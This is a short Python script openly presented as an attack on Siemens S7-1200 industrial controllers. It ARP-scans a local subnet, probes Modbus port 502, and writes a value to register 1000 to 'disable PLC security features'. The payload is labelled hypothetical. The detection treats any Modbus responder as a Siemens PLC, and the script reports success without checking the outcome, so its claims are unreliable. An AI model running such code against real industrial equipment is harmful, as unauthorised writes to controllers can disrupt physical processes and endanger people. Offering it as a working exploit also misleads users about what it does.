import scapy.all as scapy
from pyModbusTCP.client import ModbusClient
import struct
import time

# Function to scan for Siemens PLCs in the network
def find_plc():
    print("[*] Scanning network for Siemens S7-1200 PLC...")
    request = scapy.ARP(pdst="192.168.1.0/24")  # Change the subnet if needed
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / request
    answered_list = scapy.srp(packet, timeout=2, verbose=False)[0]

    for element in answered_list:
        print(f"[+] Device found: {element[1].psrc} ({element[1].hwsrc})")
        # Perform service detection
        if is_siemens_plc(element[1].psrc):
            print(f"[+] Siemens PLC detected at {element[1].psrc}")
            return element[1].psrc
    return None

# Function to check if a device is a Siemens PLC
def is_siemens_plc(ip):
    try:
        modbus_client = ModbusClient(host=ip, port=502, auto_open=True)
        if modbus_client.open():
            device_id = modbus_client.read_holding_registers(0, 1)
            if device_id:
                print(f"[+] Modbus response received from {ip}: {device_id}")
                return True
        modbus_client.close()
    except:
        return False
    return False

# Function to exploit a known security vulnerability in Siemens PLCs
def exploit_plc(plc_ip):
    print(f"[*] Attacking PLC at {plc_ip}...")

    # Attempt to manipulate security registers
    modbus_client = ModbusClient(host=plc_ip, port=502, auto_open=True)
    modbus_client.open()

    # Example: Disabling memory protection (if vulnerability exists)
    DISABLE_PROTECTION = [0x1337]  # Hypothetical exploit payload
    try:
        print("[+] Attempting to disable PLC security features...")
        modbus_client.write_multiple_registers(1000, DISABLE_PROTECTION)  # Target security registers
        print("[+] Security features bypassed successfully.")
    except Exception as e:
        print(f"[-] Exploit attempt failed: {e}")
    
    modbus_client.close()

# Main function
def main():
    plc_ip = find_plc()
    if plc_ip:
        exploit_plc(plc_ip)
    else:
        print("[-] No Siemens PLC found on the local network.")

if __name__ == "__main__":
    main()